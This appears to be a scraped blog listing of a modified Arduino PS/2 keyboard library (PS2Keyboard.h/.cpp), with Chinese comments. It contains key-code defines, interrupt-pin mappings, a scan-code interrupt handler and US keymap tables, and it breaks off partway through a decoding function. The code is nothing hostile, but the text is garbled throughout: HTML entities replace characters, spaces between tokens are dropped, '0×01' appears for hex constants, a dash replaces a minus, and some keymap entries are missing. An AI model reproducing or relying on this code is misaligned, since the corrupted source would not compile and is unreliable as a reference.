#definePS2_END&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;35
#definePS2_PAGEUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33
#definePS2_PAGEDOWN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;34
#definePS2_UPARROW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;38
#definePS2_LEFTARROW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;37
#definePS2_DOWNARROW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;40
#definePS2_RIGHTARROW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;39
#definePS2_F1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-12&nbsp;//为了避免冲突,将F1-F12的值重新定义为了负值
#definePS2_F2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-13
#definePS2_F3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-14
#definePS2_F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-15
#definePS2_F5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-16
#definePS2_F6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-17
#definePS2_F7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-18
#definePS2_F8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-19
#definePS2_F9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-20
#definePS2_F10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-21
#definePS2_F11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-22
#definePS2_F12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-23
#definePS2_SCROLL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0
/*
*&nbsp;&nbsp;这段本来定义的是各种语言的键盘中的特殊字符,基本上没有用,在这里为了不占篇幅去掉,详细源
*&nbsp;&nbsp;代码请看文后的下载地址
*/
#define&nbsp;PS2_KEYMAP_SIZE136
typedef&nbsp;struct&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_tnoshift[PS2_KEYMAP_SIZE];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_tshift[PS2_KEYMAP_SIZE];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_tuses_altgr;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_taltgr[PS2_KEYMAP_SIZE];
}&nbsp;PS2Keymap_t;
extern&nbsp;const&nbsp;PROGMEMPS2Keymap_t&nbsp;PS2Keymap_US;
extern&nbsp;const&nbsp;PROGMEMPS2Keymap_t&nbsp;PS2Keymap_German;
class&nbsp;PS2Keyboard&nbsp;{
&nbsp;&nbsp;public:
&nbsp;&nbsp;&nbsp;PS2Keyboard();
&nbsp;&nbsp;&nbsp;&nbsp;staticvoidbegin(uint8_t&nbsp;dataPin,&nbsp;uint8_t&nbsp;irq_pin,const&nbsp;PS2Keymap_t&nbsp;&amp;map=PS2Keymap_US);
&nbsp;&nbsp;&nbsp;&nbsp;staticboolavailable();
&nbsp;&nbsp;&nbsp;&nbsp;staticintread();
&nbsp;&nbsp;&nbsp;&nbsp;intreadIt();
&nbsp;&nbsp;&nbsp;intgetCombinationKey();
};
#if!defined(CORE_INT0_PIN)
#ifdefined(__AVR_ATmega1280__)&nbsp;||&nbsp;defined(__AVR_ATmega2560__)//&nbsp;ArduinoMega
#defineCORE_INT0_PIN&nbsp;2
#defineCORE_INT1_PIN&nbsp;3
#defineCORE_INT2_PIN&nbsp;21
#defineCORE_INT3_PIN&nbsp;20
#defineCORE_INT4_PIN&nbsp;19
#defineCORE_INT5_PIN&nbsp;18
#elifdefined(__AVR_ATmega644P__)&nbsp;||defined(__AVR_ATmega644__)&nbsp;//&nbsp;Sanguino
#defineCORE_INT0_PIN&nbsp;10
#defineCORE_INT1_PIN&nbsp;11
#defineCORE_INT2_PIN&nbsp;2
#elifdefined(__AVR_ATmega32U4__)&nbsp;//&nbsp;Leonardo
#define&nbsp;CORE_INT0_PIN&nbsp;3
#define&nbsp;CORE_INT1_PIN&nbsp;2
#define&nbsp;CORE_INT2_PIN&nbsp;0
#define&nbsp;CORE_INT3_PIN&nbsp;1
#else&nbsp;&nbsp;//ArduinoDuemilanove,&nbsp;Diecimila,&nbsp;LilyPad,&nbsp;Mini,&nbsp;Fio,&nbsp;etc…
#defineCORE_INT0_PIN&nbsp;2
#defineCORE_INT1_PIN&nbsp;3
#endif
#endif
#endif
&nbsp;
/*
*&nbsp;&nbsp;PS2Keyboard.cpp
*&nbsp;&nbsp;Arduino&nbsp;PS2键盘支持库
*&nbsp;&nbsp;修改自http://www.pjrc.com/teensy/arduino_libraries/PS2Keyboard.zip
*&nbsp;&nbsp;修改者:b41k3r
*&nbsp;&nbsp;基于GPLv2开源
*/
&nbsp;
#include&quot;PS2Keyboard.h&quot;
&nbsp;
#define&nbsp;BUFFER_SIZE&nbsp;45
static&nbsp;volatile&nbsp;uint8_tbuffer[BUFFER_SIZE];
static&nbsp;volatile&nbsp;uint8_thead,&nbsp;tail;
static&nbsp;uint8_t&nbsp;DataPin;
static&nbsp;uint8_tCharBuffer=0;
static&nbsp;uint8_tUTF8next=0;
static&nbsp;const&nbsp;PS2Keymap_t*keymap=NULL;
intCombinationKey=0;&nbsp;//增加了一个参数,用来判定按下的是否是功能键和组合键
&nbsp;
voidps2interrupt(void)&nbsp;//读取键盘输入的函数，基本原理同前面的demo程序
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;staticuint8_t&nbsp;bitcount=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;staticuint8_t&nbsp;incoming=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;staticuint32_t&nbsp;prev_ms=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint32_tnow_ms;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;n,val;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val&nbsp;=digitalRead(DataPin);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now_ms&nbsp;=millis();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(now_ms-&nbsp;prev_ms&nbsp;&gt;&nbsp;250)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bitcount=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;incoming=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prev_ms&nbsp;=now_ms;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n&nbsp;=bitcount&nbsp;–&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(n&nbsp;&lt;=7)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;incoming|=(val&nbsp;&lt;&lt;&nbsp;n);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bitcount++;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(bitcount&nbsp;==&nbsp;11)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_ti=&nbsp;head&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(i&gt;=&nbsp;BUFFER_SIZE)&nbsp;i&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(i!=&nbsp;tail)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer[i]=incoming;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head=&nbsp;i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bitcount=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;incoming=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
static&nbsp;inline&nbsp;uint8_tget_scan_code(void)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;c,i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;tail;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(i&nbsp;==head)&nbsp;return&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i++;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(i&nbsp;&gt;=BUFFER_SIZE)&nbsp;i&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=buffer[i];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tail&nbsp;=&nbsp;i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;c;
}
&nbsp;
const&nbsp;PROGMEM&nbsp;PS2Keymap_tPS2Keymap_US&nbsp;=&nbsp;{&nbsp;&nbsp;//预先定义好键盘上所有的常用键所对应的值
&nbsp;&nbsp;//&nbsp;without&nbsp;shift
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{0,&nbsp;PS2_F9,0,&nbsp;PS2_F5,&nbsp;PS2_F3,PS2_F1,&nbsp;PS2_F2,&nbsp;PS2_F12,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;PS2_F10,PS2_F8,&nbsp;PS2_F6,PS2_F4,&nbsp;PS2_TAB,&nbsp;&#39;`&#39;,&nbsp;0,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0/*Lalt*/,&nbsp;PS2_SHIFT,&nbsp;0,&nbsp;0/*Lctrl*/,&nbsp;&#39;q&#39;,&#39;1&#39;,0,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;&#39;z&#39;,&#39;s&#39;,&#39;a&#39;,&nbsp;&#39;w&#39;,&nbsp;&#39;2&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;c&#39;,&#39;x&#39;,&nbsp;&#39;d&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;4&#39;,&nbsp;&#39;3&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;&nbsp;&#39;,&#39;v&#39;,&nbsp;&#39;f&#39;,&nbsp;&#39;t&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;5&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;n&#39;,&#39;b&#39;,&nbsp;&#39;h&#39;,&nbsp;&#39;g&#39;,&nbsp;&#39;y&#39;,&nbsp;&#39;6&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;&#39;m&#39;,&#39;j&#39;,&nbsp;&#39;u&#39;,&nbsp;&#39;7&#39;,&nbsp;&#39;8&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;,&#39;,&#39;k&#39;,&nbsp;&#39;i&#39;,&nbsp;&#39;o&#39;,&nbsp;&#39;0&#39;,&nbsp;&#39;9&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;.&#39;,&#39;/&#39;,&nbsp;&#39;l&#39;,&nbsp;&#39;;&#39;,&nbsp;&#39;p&#39;,&nbsp;&#39;-&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;&#39;\&#39;&#39;,0,&nbsp;&#39;[&#39;,&nbsp;&#39;=&#39;,&nbsp;0,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS2_CAPS_LOCK,PS2_SHIFT,PS2_ENTER&nbsp;/*Enter*/,&nbsp;&#39;]&#39;,&nbsp;0,&nbsp;&#39;\\&#39;,&nbsp;0,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,0,&nbsp;0,&nbsp;PS2_BACKSPACE,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;1&#39;,&nbsp;0,&#39;4&#39;,&nbsp;&#39;7&#39;,&nbsp;0,&nbsp;0,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;0&#39;,&nbsp;&#39;.&#39;,&#39;2&#39;,&nbsp;&#39;5&#39;,&nbsp;&#39;6&#39;,&nbsp;&#39;8&#39;,PS2_ESC,&nbsp;0&nbsp;/*NumLock*/,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS2_F11,&#39;+&#39;,&nbsp;&#39;3&#39;,&nbsp;&#39;-&#39;,&nbsp;&#39;*&#39;,&#39;9&#39;,&nbsp;PS2_SCROLL,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;0,PS2_F7&nbsp;},

&nbsp;&nbsp;//&nbsp;with&nbsp;shift

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{0,&nbsp;PS2_F9,0,&nbsp;PS2_F5,&nbsp;PS2_F3,PS2_F1,&nbsp;PS2_F2,&nbsp;PS2_F12,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;PS2_F10,PS2_F8,&nbsp;PS2_F6,PS2_F4,&nbsp;PS2_TAB,&nbsp;&#39;~&#39;,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0/*Lalt*/,&nbsp;PS2_SHIFT,&nbsp;0,&nbsp;0/*Lctrl*/,&nbsp;&#39;Q&#39;,&nbsp;&#39;!&#39;,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;&#39;Z&#39;,&#39;S&#39;,&nbsp;&#39;A&#39;,&nbsp;&#39;W&#39;,&nbsp;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;C&#39;,&#39;X&#39;,&nbsp;&#39;D&#39;,&nbsp;&#39;E&#39;,&nbsp;&#39;,&nbsp;&#39;#&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;&nbsp;&#39;,&#39;V&#39;,&nbsp;&#39;F&#39;,&nbsp;&#39;T&#39;,&nbsp;&#39;R&#39;,&nbsp;&#39;%&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;N&#39;,&#39;B&#39;,&nbsp;&#39;H&#39;,&nbsp;&#39;G&#39;,&nbsp;&#39;Y&#39;,&nbsp;&#39;^&#39;,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;&#39;M&#39;,&#39;J&#39;,&nbsp;&#39;U&#39;,&nbsp;&#39;&amp;&#39;,&#39;*&#39;,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;&lt;&#39;,&#39;K&#39;,&nbsp;&#39;I&#39;,&nbsp;&#39;O&#39;,&nbsp;&#39;)&#39;,&#39;(&#39;,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;&gt;&#39;,&#39;?&#39;,&nbsp;&#39;L&#39;,&nbsp;&#39;:&#39;,&nbsp;&#39;P&#39;,&#39;_&#39;,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&#39;&quot;&#39;,&nbsp;0,&nbsp;&#39;{&#39;,&nbsp;&#39;+&#39;,&nbsp;0,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS2_CAPS_LOCK,PS2_SHIFT,PS2_ENTER&nbsp;/*Enter*/,&nbsp;&#39;}&#39;,&nbsp;0,&nbsp;&#39;|&#39;,&nbsp;0,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,0,&nbsp;0,&nbsp;PS2_BACKSPACE,0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;&#39;1&#39;,&nbsp;0,&#39;4&#39;,&nbsp;&#39;7&#39;,&nbsp;0,&nbsp;0,&nbsp;0,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;0&#39;,&nbsp;&#39;.&#39;,&#39;2&#39;,&nbsp;&#39;5&#39;,&nbsp;&#39;6&#39;,&nbsp;&#39;8&#39;,PS2_ESC,&nbsp;0&nbsp;/*NumLock*/,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS2_F11,&#39;+&#39;,&nbsp;&#39;3&#39;,&nbsp;&#39;-&#39;,&nbsp;&#39;*&#39;,&#39;9&#39;,&nbsp;PS2_SCROLL,&nbsp;0,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;0,PS2_F7&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0
};
&nbsp;
#defineBREAK&nbsp;&nbsp;&nbsp;&nbsp;0×01
#defineMODIFIER&nbsp;0×02
#defineSHIFT_L&nbsp;&nbsp;0×04
#defineSHIFT_R&nbsp;&nbsp;0×08
#defineALTGR&nbsp;&nbsp;&nbsp;&nbsp;0×10
#defineCTRL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0×20
&nbsp;
static&nbsp;charget_iso8859_code(void)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;staticuint8_t&nbsp;state=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;s;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;c;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(1)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s=get_scan_code();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!s)return&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(s==&nbsp;0xF0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state|=BREAK;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}elseif&nbsp;(s&nbsp;==&nbsp;0xE0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state|=MODIFIER;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(state&amp;&nbsp;BREAK)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(s&nbsp;==&nbsp;0×12){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&amp;=~SHIFT_L;
